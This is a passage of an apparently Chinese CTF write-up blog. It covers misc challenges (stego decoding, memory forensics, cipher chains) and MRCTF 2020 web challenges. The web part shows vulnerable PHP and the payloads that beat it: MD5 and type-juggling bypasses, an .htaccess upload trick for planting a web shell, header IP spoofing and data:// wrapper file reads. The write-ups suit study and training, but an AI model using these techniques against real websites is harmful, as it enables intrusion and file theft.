\u0026#39;tapeworm\u0026#39;, \u0026#39;tempest\u0026#39;, \u0026#39;tiger\u0026#39;, \u0026#39;tissue\u0026#39;, \u0026#39;tonic\u0026#39;, \u0026#39;topmost\u0026#39;, \u0026#39;tracker\u0026#39;, \u0026#39;transit\u0026#39;, \u0026#39;trauma\u0026#39;, \u0026#39;treadmill\u0026#39;, \u0026#39;Trojan\u0026#39;, \u0026#39;trouble\u0026#39;, \u0026#39;tumor\u0026#39;, \u0026#39;tunnel\u0026#39;, \u0026#39;tycoon\u0026#39;, \u0026#39;uncut\u0026#39;, \u0026#39;unearth\u0026#39;, \u0026#39;unwind\u0026#39;, \u0026#39;uproot\u0026#39;, \u0026#39;upset\u0026#39;, \u0026#39;upshot\u0026#39;, \u0026#39;vapor\u0026#39;, \u0026#39;village\u0026#39;, \u0026#39;virus\u0026#39;, \u0026#39;Vulcan\u0026#39;, \u0026#39;waffle\u0026#39;, \u0026#39;wallet\u0026#39;, \u0026#39;watchword\u0026#39;, \u0026#39;wayside\u0026#39;, \u0026#39;willow\u0026#39;, \u0026#39;woodlark\u0026#39;, \u0026#39;Zulu\u0026#39;] even_list = [\u0026#39;adroitness\u0026#39;, \u0026#39;adviser\u0026#39;, \u0026#39;aftermath\u0026#39;, \u0026#39;aggregate\u0026#39;, \u0026#39;alkali\u0026#39;, \u0026#39;almighty\u0026#39;, \u0026#39;amulet\u0026#39;, \u0026#39;amusement\u0026#39;, \u0026#39;antenna\u0026#39;, \u0026#39;applicant\u0026#39;, \u0026#39;Apollo\u0026#39;, \u0026#39;armistice\u0026#39;, \u0026#39;article\u0026#39;, \u0026#39;asteroid\u0026#39;, \u0026#39;Atlantic\u0026#39;, \u0026#39;atmosphere\u0026#39;, \u0026#39;autopsy\u0026#39;, \u0026#39;Babylon\u0026#39;, \u0026#39;backwater\u0026#39;, \u0026#39;barbecue\u0026#39;, \u0026#39;belowground\u0026#39;, \u0026#39;bifocals\u0026#39;, \u0026#39;bodyguard\u0026#39;, \u0026#39;bookseller\u0026#39;, \u0026#39;borderline\u0026#39;, \u0026#39;bottomless\u0026#39;, \u0026#39;Bradbury\u0026#39;, \u0026#39;bravado\u0026#39;, \u0026#39;Brazilian\u0026#39;, \u0026#39;breakaway\u0026#39;, \u0026#39;Burlington\u0026#39;, \u0026#39;businessman\u0026#39;, \u0026#39;butterfat\u0026#39;, \u0026#39;Camelot\u0026#39;, \u0026#39;candidate\u0026#39;, \u0026#39;cannonball\u0026#39;, \u0026#39;Capricorn\u0026#39;, \u0026#39;caravan\u0026#39;, \u0026#39;caretaker\u0026#39;, \u0026#39;celebrate\u0026#39;, \u0026#39;cellulose\u0026#39;, \u0026#39;certify\u0026#39;, \u0026#39;chambermaid\u0026#39;, \u0026#39;Cherokee\u0026#39;, \u0026#39;Chicago\u0026#39;, \u0026#39;clergyman\u0026#39;, \u0026#39;coherence\u0026#39;, \u0026#39;combustion\u0026#39;, \u0026#39;commando\u0026#39;, \u0026#39;company\u0026#39;, \u0026#39;component\u0026#39;, \u0026#39;concurrent\u0026#39;, \u0026#39;confidence\u0026#39;, \u0026#39;conformist\u0026#39;, \u0026#39;congregate\u0026#39;, \u0026#39;consensus\u0026#39;, \u0026#39;consulting\u0026#39;, \u0026#39;corporate\u0026#39;, \u0026#39;corrosion\u0026#39;, \u0026#39;councilman\u0026#39;, \u0026#39;crossover\u0026#39;, \u0026#39;crucifix\u0026#39;, \u0026#39;cumbersome\u0026#39;, \u0026#39;customer\u0026#39;, \u0026#39;Dakota\u0026#39;, \u0026#39;decadence\u0026#39;, \u0026#39;December\u0026#39;, \u0026#39;decimal\u0026#39;, \u0026#39;designing\u0026#39;, \u0026#39;detector\u0026#39;, \u0026#39;detergent\u0026#39;, \u0026#39;determine\u0026#39;, \u0026#39;dictator\u0026#39;, \u0026#39;dinosaur\u0026#39;, \u0026#39;direction\u0026#39;, \u0026#39;disable\u0026#39;, \u0026#39;disbelief\u0026#39;, \u0026#39;disruptive\u0026#39;, \u0026#39;distortion\u0026#39;, \u0026#39;document\u0026#39;, \u0026#39;embezzle\u0026#39;, \u0026#39;enchanting\u0026#39;, \u0026#39;enrollment\u0026#39;, \u0026#39;enterprise\u0026#39;, \u0026#39;equation\u0026#39;, \u0026#39;equipment\u0026#39;, \u0026#39;escapade\u0026#39;, \u0026#39;Eskimo\u0026#39;, \u0026#39;everyday\u0026#39;, \u0026#39;examine\u0026#39;, \u0026#39;existence\u0026#39;, \u0026#39;exodus\u0026#39;, \u0026#39;fascinate\u0026#39;, \u0026#39;filament\u0026#39;, \u0026#39;finicky\u0026#39;, \u0026#39;forever\u0026#39;, \u0026#39;fortitude\u0026#39;, \u0026#39;frequency\u0026#39;, \u0026#39;gadgetry\u0026#39;, \u0026#39;Galveston\u0026#39;, \u0026#39;getaway\u0026#39;, \u0026#39;glossary\u0026#39;, \u0026#39;gossamer\u0026#39;, \u0026#39;graduate\u0026#39;, \u0026#39;gravity\u0026#39;, \u0026#39;guitarist\u0026#39;, \u0026#39;hamburger\u0026#39;, \u0026#39;Hamilton\u0026#39;, \u0026#39;handiwork\u0026#39;, \u0026#39;hazardous\u0026#39;, \u0026#39;headwaters\u0026#39;, \u0026#39;hemisphere\u0026#39;, \u0026#39;hesitate\u0026#39;, \u0026#39;hideaway\u0026#39;, \u0026#39;holiness\u0026#39;, \u0026#39;hurricane\u0026#39;, \u0026#39;hydraulic\u0026#39;, \u0026#39;impartial\u0026#39;, \u0026#39;impetus\u0026#39;, \u0026#39;inception\u0026#39;, \u0026#39;indigo\u0026#39;, \u0026#39;inertia\u0026#39;, \u0026#39;infancy\u0026#39;, \u0026#39;inferno\u0026#39;, \u0026#39;informant\u0026#39;, \u0026#39;insincere\u0026#39;, \u0026#39;insurgent\u0026#39;, \u0026#39;integrate\u0026#39;, \u0026#39;intention\u0026#39;, \u0026#39;inventive\u0026#39;, \u0026#39;Istanbul\u0026#39;, \u0026#39;Jamaica\u0026#39;, \u0026#39;Jupiter\u0026#39;, \u0026#39;leprosy\u0026#39;, \u0026#39;letterhead\u0026#39;, \u0026#39;liberty\u0026#39;, \u0026#39;maritime\u0026#39;, \u0026#39;matchmaker\u0026#39;, \u0026#39;maverick\u0026#39;, \u0026#39;Medusa\u0026#39;, \u0026#39;megaton\u0026#39;, \u0026#39;microscope\u0026#39;, \u0026#39;microwave\u0026#39;, \u0026#39;midsummer\u0026#39;, \u0026#39;millionaire\u0026#39;, \u0026#39;miracle\u0026#39;, \u0026#39;misnomer\u0026#39;, \u0026#39;molasses\u0026#39;, \u0026#39;molecule\u0026#39;, \u0026#39;Montana\u0026#39;, \u0026#39;monument\u0026#39;, \u0026#39;mosquito\u0026#39;, \u0026#39;narrative\u0026#39;, \u0026#39;nebula\u0026#39;, \u0026#39;newsletter\u0026#39;, \u0026#39;Norwegian\u0026#39;, \u0026#39;October\u0026#39;, \u0026#39;Ohio\u0026#39;, \u0026#39;onlooker\u0026#39;, \u0026#39;opulent\u0026#39;, \u0026#39;Orlando\u0026#39;, \u0026#39;outfielder\u0026#39;, \u0026#39;Pacific\u0026#39;, \u0026#39;pandemic\u0026#39;, \u0026#39;Pandora\u0026#39;, \u0026#39;paperweight\u0026#39;, \u0026#39;paragon\u0026#39;, \u0026#39;paragraph\u0026#39;, \u0026#39;paramount\u0026#39;, \u0026#39;passenger\u0026#39;, \u0026#39;pedigree\u0026#39;, \u0026#39;Pegasus\u0026#39;, \u0026#39;penetrate\u0026#39;, \u0026#39;perceptive\u0026#39;, \u0026#39;performance\u0026#39;, \u0026#39;pharmacy\u0026#39;, \u0026#39;phonetic\u0026#39;, \u0026#39;photograph\u0026#39;, \u0026#39;pioneer\u0026#39;, \u0026#39;pocketful\u0026#39;, \u0026#39;politeness\u0026#39;, \u0026#39;positive\u0026#39;, \u0026#39;potato\u0026#39;, \u0026#39;processor\u0026#39;, \u0026#39;provincial\u0026#39;, \u0026#39;proximate\u0026#39;, \u0026#39;puberty\u0026#39;, \u0026#39;publisher\u0026#39;, \u0026#39;pyramid\u0026#39;, \u0026#39;quantity\u0026#39;, \u0026#39;racketeer\u0026#39;, \u0026#39;rebellion\u0026#39;, \u0026#39;recipe\u0026#39;, \u0026#39;recover\u0026#39;, \u0026#39;repellent\u0026#39;, \u0026#39;replica\u0026#39;, \u0026#39;reproduce\u0026#39;, \u0026#39;resistor\u0026#39;, \u0026#39;responsive\u0026#39;, \u0026#39;retraction\u0026#39;, \u0026#39;retrieval\u0026#39;, \u0026#39;retrospect\u0026#39;, \u0026#39;revenue\u0026#39;, \u0026#39;revival\u0026#39;, \u0026#39;revolver\u0026#39;, \u0026#39;sandalwood\u0026#39;, \u0026#39;sardonic\u0026#39;, \u0026#39;Saturday\u0026#39;, \u0026#39;savagery\u0026#39;, \u0026#39;scavenger\u0026#39;, \u0026#39;sensation\u0026#39;, \u0026#39;sociable\u0026#39;, \u0026#39;souvenir\u0026#39;, \u0026#39;specialist\u0026#39;, \u0026#39;speculate\u0026#39;, \u0026#39;stethoscope\u0026#39;, \u0026#39;stupendous\u0026#39;, \u0026#39;supportive\u0026#39;, \u0026#39;surrender\u0026#39;, \u0026#39;suspicious\u0026#39;, \u0026#39;sympathy\u0026#39;, \u0026#39;tambourine\u0026#39;, \u0026#39;telephone\u0026#39;, \u0026#39;therapist\u0026#39;, \u0026#39;tobacco\u0026#39;, \u0026#39;tolerance\u0026#39;, \u0026#39;tomorrow\u0026#39;, \u0026#39;torpedo\u0026#39;, \u0026#39;tradition\u0026#39;, \u0026#39;travesty\u0026#39;, \u0026#39;trombonist\u0026#39;, \u0026#39;truncated\u0026#39;, \u0026#39;typewriter\u0026#39;, \u0026#39;ultimate\u0026#39;, \u0026#39;undaunted\u0026#39;, \u0026#39;underfoot\u0026#39;, \u0026#39;unicorn\u0026#39;, \u0026#39;unify\u0026#39;, \u0026#39;universe\u0026#39;, \u0026#39;unravel\u0026#39;, \u0026#39;upcoming\u0026#39;, \u0026#39;vacancy\u0026#39;, \u0026#39;vagabond\u0026#39;, \u0026#39;vertigo\u0026#39;, \u0026#39;Virginia\u0026#39;, \u0026#39;visitor\u0026#39;, \u0026#39;vocalist\u0026#39;, \u0026#39;voyager\u0026#39;, \u0026#39;warranty\u0026#39;, \u0026#39;Waterloo\u0026#39;, \u0026#39;whimsical\u0026#39;, \u0026#39;Wichita\u0026#39;, \u0026#39;Wilmington\u0026#39;, \u0026#39;Wyoming\u0026#39;, \u0026#39;yesteryear\u0026#39;, \u0026#39;Yucatan\u0026#39;] for i in range(len(cipher)): for j in range(len(odd_list)): if odd_list[j] == cipher[i]: cipher[i:i+1] = chr(j) for k in range(len(even_list)): if odd_list[k] == cipher[i]: cipher[i:i+1] = chr(k) for i in cipher: print(i,end=\u0026#39;\u0026#39;)   GitHub找到个stegpy的项目\n1  pip3 install stegpy   1 2  $ stegpy.exe encode.webp the_password_is:Yus@_1s_YYddddsstegpy encode.webp the_key_is:Yus@_yydsstegpy!!   得到两个密码 都试了一下 第二个能解hint.rar得到一个hint.jpg\n官方放了个hint：invisible 不然我要骂人了。InvisibleSecre隐写 华军上下了一个很古老的软件。。。。\n网页源码里说\u0026quot;Yusa\u0026quot;在这题很重要 用\u0026quot;Yusa\u0026quot;解密，加密算法选最后一个，得到encode脚本\n简单分析一下是生成两个随机密钥流 然后跟flag.png 每像素异或 然后用lsb原理往source.png像素里加flag.png 流1加密在R通道 流2加密在G通道 enc写到B通道\n解密只需各个取出最后一位 然后异或回来就是flag了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  from PIL import Image en_p = Image.open(\u0026#39;./encode.png\u0026#39;).convert(\u0026#39;RGB\u0026#39;) a,b = en_p.size R=[] G=[] B=[] key1stream = [] key2stream = [] enc = [] flag = [] for x in range(a): for y in range(b): tmp = en_p.getpixel((x,y)) R.append(tmp[0]) G.append(tmp[1]) B.append(tmp[2]) # 取出lsb数据 for i in range(len(R)): if bin(R[i])[-1] == \u0026#39;1\u0026#39;: key1stream.append(1) else: key1stream.append(0) if bin(G[i])[-1] == \u0026#39;1\u0026#39;: key2stream.append(1) else: key2stream.append(0) if bin(B[i])[-1] == \u0026#39;1\u0026#39;: enc.append(1) else: enc.append(0) # 恢复flag for i in range(len(enc)): flag.append(enc[i]^key1stream[i]^key2stream[i]) # 简单画一下 img = Image.new(\u0026#39;RGB\u0026#39;,(a,b),(255,255,255)) for x in range(a): for y in range(b): if flag[y+x*b] == 0: img.putpixel((x,y),(0,0,0)) else: img.putpixel((x,y),(255,255,255)) img.save(\u0026#39;flag.png\u0026#39;)   指鹿为马 CNN 我继续爬\n据说ps一下也成，没成功，呜呜呜\nopencv改下透明度 拼一下图\n1 2 3 4 5 6  import cv2 as cv alpha = 0.5 horse = cv.imread(\u0026#39;horse.png\u0026#39;) deer = cv.imread(\u0026#39;deer.png\u0026#39;) dst = cv.addWeighted(horse, alpha, deer, 0.4, 0.0) cv.imwrite(\u0026#39;image.png\u0026#39;, dst)   复现的时候靶机已经关了，本地魔改了一下能跑出来。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  def main(): while 1: pic = base64.b64encode(open(\u0026#39;./image.png\u0026#39;, \u0026#34;rb\u0026#34;).read()) try: pic = base64.b64decode(pic) except: exit() if b\u0026#34;\u0026lt;?php\u0026#34; in pic or b\u0026#39;eval\u0026#39; in pic: print(\u0026#34;Hacker!!This is not WEB,It`s Just a misc!!!\u0026#34;) exit() salt = str(random.getrandbits(15)) pic_name = \u0026#39;tmp_\u0026#39;+salt+\u0026#39;.png\u0026#39; tmp_pic = open(pic_name,\u0026#39;wb\u0026#39;) tmp_pic.write(pic) tmp_pic.close() ma = load_horse() lu = load_deer() k = 1 trainingSet = np.append(ma, lu).reshape(2, 5185) testSet = load_test(pic_name) neighbors = getNeighbors(trainingSet, testSet[0], k) result = getResponse(neighbors) if repr(result) == \u0026#39;0\u0026#39;: print(\u0026#39;Yes,I want this horse like deer,here is your flag encoded by base64\u0026#39;) flag = base64.b64encode(open(\u0026#39;flag\u0026#39;,\u0026#39;rb\u0026#39;).read()) print(flag.decode()) os.remove(pic_name) break else: print(\u0026#39;I want horse but not deer!!!\u0026#39;) os.remove(pic_name) break exit()   Barbar 得到一个附件超大QRcode，CQR扫码看到一串问号，微信扫码却没看到，第一反应就是零宽字符。\n但是一开始找的网站解密错误得到错的，然后整个题目毫无进展。最后得到一个能正确解的网站。。。。wsfw没错了\n1 2  False:ntentteanetekettterieeenaeatttedtttt True:YcfVgMBUraXftwO6Cp92YBGAbyRyWNOO   解压得到一个破损二维码和一个docx，修复二维码扫描得到这个，我透！\ndocx丢kali在document.xml里找到一串base64\n去掉中间的字符后解码得到一个Aztec Code\n可以在线解码得到一串flag类似物\ndi`f{e1c64e14db14c6bb8faabab5bd7be1dc}\r至此无后续了，只有感觉没用到题目hint：bar和bar之间有着非同寻常的联系\n感觉那个修复的二维码里还有东西\n好了，官方出wp了，我是废物，使用npiet出flag\n第一届太湖杯Misc题解 memory 签到题\n1 2 3 4  问windows动态链接库管家吧，他会告诉你answer 原始题目下载地址：https://pan.baidu.com/s/1tmM-wjyMZ_SHdDJ82Qaq7A(3qci) 提前下发的题目压缩包密码：welc0me_to_Asuri_w0rld   题目给的hint感觉有误导性，提示看dll，然是列了一下啥也看不出。然后去给做了web签到题，看了其余两个misc大致啥样，回来继续做。\n1 2 3 4 5 6  # iehistory看到桌面的Desktop/Untitled.png volatility -f dump --profile=Win7SP1x86 iehistory # filescan看一下地址 volatility -f dump --profile=Win7SP1x86 filescan | grep \u0026#34;Untitled.png\u0026#34; # dumpfiles弄下图片 里面就是flag volatility -f dump --profile=Win7SP1x86 dumpfiles -Q 0x000000003fdf6118 -D ./   拿了个一血还是很香的\nmisc 这是最让人蛋疼的一题，这题出的真不太行。\n得到一个zip，解压可以得到fun.zip 同时伪加密可以得到omisc.docx\ndocx里有两行隐藏文字\n1 2  waoootu.epj,nv o www.verymuch.net   前面一直没人解出来，知道给了hint是希尔密码，使用在线工具解得\n1  love and peaceee   rabiit解密得到\n1  LR2TMNLCGBOHKNDGGVRFY5JWGZTDAXDVMZTDCYK4OU4GCZRYLR2TSNTCHBOHKNJUMM4VY5JVGBSTOXDVHE3DIZC4OU2TIM3ELR2TQYLGHBOHKOJWGQYFY5JWGQ3DSXDVHE3GEOC4OU2TAZJXLR2TOZRTMROHKOBVME4VY5JVGRQTIXDVHAYDEOC4OU4GCZRYLR2TSNTCHBOHKNRRGY3VY5JVHA2WKXDVHAZDOMS4OU2WGMDBLR2TKNDDHFOHKODGMU3FY5JYMFSTMXDVG5QTOYK4OU3DENBQLR2TSNRUMROHKNRSGEYVY5JVMZTDKXDVHE3GEOC4OU3TSNJXLR2TQYLFGZOHKNLGMY2VY5JVGRRTSXDVHE3DIMC4OU2TMYRULR2TKNDDHFOHKNJWMM4VY5JUMZSWKXDVGU4TGN24OU4TMM3GLR2TMY3FGJOHKOBSG4ZFY5JYGM4GCXDVGVRGGMS4OU4GCZJWLR2TKOBVMVOHKNJUHEZFY5JYGM4GCXDVG43TGZK4OU3DEMJRLR2TKNDDHFOHKNRSGQYFY5JUMYYGMXDVHAYDKZK4OU4DKYJZLR2TSNTCHBOHKNRRGBSFY5JZGVRWIXDVGU2DGNS4OU3DENBQLR2TIZTFMVOHKNRWGJTFY5JYGI3TEXDVGY2DMOK4OU4GCMZWLR2TKNTCGROHKNJUMM4VY5JZHA2TQXDVGYYTAZC4OU2TIYZZLR2TKMZXGNOHKNDGMVSVY5JVGRRTSXDVG5QTOYK4OU4DOMLDLR2TSNRUGBOHKNJWMM4VY5JUMYYGMXDVGVTGMNK4OU2TIYZZLR2TMNBWHFOHKNJUMM4VY5JUMVQTMXDVHAZTQYK4OU2TIYZZLR2TONZTMVOHKNJUME2FY5JVHE4DEXDVHE4DKOC4OU2TSOBS   base32得到\n1  b\u0026#39;\\\\u65b0\\\\u4f5b\\\\u66f0\\\\uff1a\\\\u8af8\\\\u96b8\\\\u54c9\\\\u50e7\\\\u964d\\\\u543d\\\\u8af8\\\\u9640\\\\u6469\\\\u96b8\\\\u50e7\\\\u7f3d\\\\u85a9\\\\u54a4\\\\u8028\\\\u8af8\\\\u96b8\\\\u6167\\\\u585e\\\\u8272\\\\u5c0a\\\\u54c9\\\\u8fe6\\\\u8ae6\\\\u7a7a\\\\u6240\\\\u964d\\\\u6211\\\\u5ff5\\\\u96b8\\\\u7957\\\\u8ae6\\\\u5ff5\\\\u54c9\\\\u9640\\\\u56b4\\\\u54c9\\\\u56c9\\\\u4fee\\\\u5937\\\\u963f\\\\u6ce2\\\\u8272\\\\u838a\\\\u5bc2\\\\u8ae6\\\\u585e\\\\u5492\\\\u838a\\\\u773e\\\\u6211\\\\u54c9\\\\u6240\\\\u4f0f\\\\u805e\\\\u85a9\\\\u96b8\\\\u610d\\\\u95cd\\\\u5436\\\\u6240\\\\u4fee\\\\u662f\\\\u8272\\\\u6469\\\\u8a36\\\\u56b4\\\\u54c9\\\\u9858\\\\u610d\\\\u54c9\\\\u5373\\\\u4fee\\\\u54c9\\\\u7a7a\\\\u871c\\\\u9640\\\\u56c9\\\\u4f0f\\\\u5ff5\\\\u54c9\\\\u6469\\\\u54c9\\\\u4ea6\\\\u838a\\\\u54c9\\\\u773e\\\\u54a4\\\\u5982\\\\u9858\\\\u5982\u0026#39;   unicode得到\n1  新佛曰：諸隸哉僧降吽諸陀摩隸僧缽薩咤耨諸隸慧塞色尊哉迦諦空所降我念隸祗諦念哉陀嚴哉囉修夷阿波色莊寂諦塞咒莊眾我哉所伏聞薩隸愍闍吶所修是色摩訶嚴哉願愍哉即修哉空蜜陀囉伏念哉摩哉亦莊哉眾咤如願如   新佛曰得到\n1  Live beautifully, dream passionately, love completely.   解密前面的zip得到音频，频谱图就是flag\nbroken_secret 给了个hint：图上信息很重要\n这题最后就四个解，我没解出来。\n解压得到不能打开的pdf，发现里面obj的o被替换乘了@，换回来就能正常打开了，有个fakeflag，然后里面好像还有两个stream没有被解析，不会做了。\n2020MRCTF writeup ez_bypass 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  \u0026lt;?php I put something in F12 for you include \u0026#39;flag.php\u0026#39;; $flag=\u0026#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}\u0026#39;; if(isset($_GET[\u0026#39;gg\u0026#39;])\u0026amp;\u0026amp;isset($_GET[\u0026#39;id\u0026#39;])) { $id=$_GET[\u0026#39;id\u0026#39;]; $gg=$_GET[\u0026#39;gg\u0026#39;]; if (md5($id) === md5($gg) \u0026amp;\u0026amp; $id !== $gg) { echo \u0026#39;You got the first step\u0026#39;; if(isset($_POST[\u0026#39;passwd\u0026#39;])) { $passwd=$_POST[\u0026#39;passwd\u0026#39;]; if (!is_numeric($passwd)) { if($passwd==1234567) { echo \u0026#39;Good Job!\u0026#39;; highlight_file(\u0026#39;flag.php\u0026#39;); die(\u0026#39;By Retr_0\u0026#39;); } else { echo \u0026#34;can you think twice??\u0026#34;; } } else{ echo \u0026#39;You can not get it !\u0026#39;; } } else{ die(\u0026#39;only one way to get the flag\u0026#39;); } } else { echo \u0026#34;You are not a real hacker!\u0026#34;; } } else{ die(\u0026#39;Please input first\u0026#39;); } }Please input first   源码简单分析就是要md5绕过+is_numeric绕过\n你传你🐎呢 尝试以后发现只能上传图片 图片上传后但是连不上\n尝试上传其他文件但是全都不行 考虑 .htaccess 允许上传\n但是 .htaccess 也不能传 传个图片抓包改下 .htaccess\n最后再传个图片改成 ma.ma 就上传成功了 准备蚁剑\n有时候能连成功有时候疯狂报错连上后也很满很慢。。。\n最后找到在flag在根目录\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  # 连上后能看到的upload.php \u0026lt;?php session_start(); echo \u0026#34; \u0026lt;meta charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\u0026#34;; if(!isset($_SESSION[\u0026#39;user\u0026#39;])){ $_SESSION[\u0026#39;user\u0026#39;] = md5((string)time() . (string)rand(100, 1000)); } if(isset($_FILES[\u0026#39;uploaded\u0026#39;])) { $target_path = getcwd() . \u0026#34;/upload/\u0026#34; . md5($_SESSION[\u0026#39;user\u0026#39;]); $t_path = $target_path . \u0026#34;/\u0026#34; . basename($_FILES[\u0026#39;uploaded\u0026#39;][\u0026#39;name\u0026#39;]); $uploaded_name = $_FILES[\u0026#39;uploaded\u0026#39;][\u0026#39;name\u0026#39;]; $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name,\u0026#39;.\u0026#39;) + 1); $uploaded_size = $_FILES[\u0026#39;uploaded\u0026#39;][\u0026#39;size\u0026#39;]; $uploaded_tmp = $_FILES[\u0026#39;uploaded\u0026#39;][\u0026#39;tmp_name\u0026#39;]; if(preg_match(\u0026#34;/ph/i\u0026#34;, strtolower($uploaded_ext))){ die(\u0026#34;我扌your problem?\u0026#34;); } else{ if ((($_FILES[\u0026#34;uploaded\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34; \u0026#34;) || ($_FILES[\u0026#34;uploaded\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/jpeg\u0026#34;) || ($_FILES[\u0026#34;uploaded\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/pjpeg\u0026#34;)|| ($_FILES[\u0026#34;uploaded\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/png\u0026#34;)) \u0026amp;\u0026amp; ($_FILES[\u0026#34;uploaded\u0026#34;][\u0026#34;size\u0026#34;] \u0026lt; 2048)){ $content = file_get_contents($uploaded_tmp); mkdir(iconv(\u0026#34;UTF-8\u0026#34;, \u0026#34;GBK\u0026#34;, $target_path), 0777, true); move_uploaded_file($uploaded_tmp, $t_path); echo \u0026#34;{$t_path}succesfully uploaded!\u0026#34;; } else{ die(\u0026#34;我扌your problem?\u0026#34;); } } } ?\u0026gt;  PYwebsite 第一眼看到题目还以为是py写的website 结果是这题可以付钱py 哈哈有点意思\n其实我在首页看了挺久的 啥也没有。。。。\n然后看了一下 Target 眼前一亮\n抓包说他自己可以获得 很明显的xff了\n改下xff轻松获取flag\n套娃 就套娃呗。。。\n1 2 3 4 5 6 7 8 9 10 11 12 13  #第一层 #payload——http://5772a629-7e5b-45aa-9414-ce874dd6d4ab.merak-ctf.site/?b.u.p.t=23333%0a #php解析会把 . 解析成 _ #有师傅说这里只过滤了 %0f 其实用 %0F 也可以绕过 但是我试了不行 \u0026lt;?php $query = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; if( substr_count($query, \u0026#39;_\u0026#39;) !== 0 || substr_count($query, \u0026#39;%5f\u0026#39;) != 0 ){ die(\u0026#39;Y0u are So cutE!\u0026#39;); } if($_GET[\u0026#39;b_u_p_t\u0026#39;] !== \u0026#39;23333\u0026#39; \u0026amp;\u0026amp; preg_match(\u0026#39;/^23333$/\u0026#39;, $_GET[\u0026#39;b_u_p_t\u0026#39;])){ echo \u0026#34;you are going to the next ~\u0026#34;; }   提示flag在secrettw.php 查看源码 是js console跑一下 提示传 Merak(本来我看到页面的ip还以为要改xff呢 结果传个参就行)\n传参127.0.0.1出源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  #第二层 #payload——http://e89f0e7e-b386-4abc-b337-95227c876cf3.merak-ctf.site/secrettw.php?2333=%64%61%74%61%3a%2c%74%6f%64%61%74%20%69%73%20%61%20%68%61%70%70%79%20%64%61%79\u0026amp;file=ZmpdYSZmXGI= \u0026lt;?php error_reporting(0); include \u0026#39;takeip.php\u0026#39;; ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;.\u0026#39;); #为打开文件设置默认当前文件夹 include \u0026#39;flag.php\u0026#39;; if(isset($_POST[\u0026#39;Merak\u0026#39;])){ highlight_file(__FILE__); die(); } function change($v){ $v = base64_decode($v); $re = \u0026#39;\u0026#39;; for($i=0;$i\u0026lt;strlen($v);$i++){ $re .= chr ( ord ($v[$i]) + $i*2 ); } return $re; } echo \u0026#39;Local access only!\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; $ip = getIp(); if($ip!=\u0026#39;127.0.0.1\u0026#39;) echo \u0026#34;Sorry,you don\u0026#39;t have permission! Your ip is :\u0026#34;.$ip; if($ip === \u0026#39;127.0.0.1\u0026#39; \u0026amp;\u0026amp; file_get_contents($_GET[\u0026#39;2333\u0026#39;]) === \u0026#39;todat is a happy day\u0026#39; ){ echo \u0026#34;Your REQUEST is:\u0026#34;.change($_GET[\u0026#39;file\u0026#39;]); echo file_get_contents(change($_GET[\u0026#39;file\u0026#39;])); } ?\u0026gt;  这里有个逆向\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  #ord — 转换字符串第一个字节为 0-255 之间的值 #chr — 返回指定的字符 #两个是互补的 整个意思就是 #$_GET[\u0026#39;file\u0026#39;]最后要变成flag.php #1.base64解码 #2.逐位ord后加02468....后返回 #稍微改一下写个php脚本就行 $v=\u0026#34;flag.php\u0026#34;; function change($v){ $re = \u0026#39;\u0026#39;; for($i=0;$i\u0026lt;strlen($v);$i++){ // $re .= chr ( ord ($v[$i]) + $i*2 );  $re .= chr ( ord ($v[$i]) - $i*2 ); } return $re; } echo base64_encode(change($v));   这题改xff是不行的 要改 client-ip 原因看源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  #takeip.php \u0026lt;?php function getIp() { if ($_SERVER[\u0026#34;HTTP_CLIENT_IP\u0026#34;] \u0026amp;\u0026amp; strcasecmp($_SERVER[\u0026#34;HTTP_CLIENT_IP\u0026#34;], \u0026#34;unknown\u0026#34;)) { $ip = $_SERVER[\u0026#34;HTTP_CLIENT_IP\u0026#34;]; } else { if ($_SERVER[\u0026#34;HTTP_X_FORWARDED_FOR\u0026#34;] \u0026amp;\u0026amp; strcasecmp($_SERVER[\u0026#34;HTTP_X_FORWARDED_FOR\u0026#34;], \u0026#34;unknown\u0026#34;)) { return \u0026#34;sorry,this way is banned!\u0026#34;; } else { if ($_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;] \u0026amp;\u0026amp; strcasecmp($_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;], \u0026#34;unknown\u0026#34;)) { $ip = $_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]; } else { if (isset ($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]) \u0026amp;\u0026amp; $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] \u0026amp;\u0026amp; strcasecmp($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;], \u0026#34;unknown\u0026#34;) ) { $ip = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; } else { $ip = \u0026#34;unknown\u0026#34;; } } } } return ($ip); }   Ezaudit 进去一个很正经的网站 链接全没用 就是个空网站\n扫站看到令人欣慰的绿色\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53  #压缩包就一个login.php \u0026lt;?php header(\u0026#39;Content-type:text/html; charset=utf-8\u0026#39;); error_reporting(0); if(isset($_POST[\u0026#39;login\u0026#39;])){ $username = $_POST[\u0026#39;username\u0026#39;]; $password = 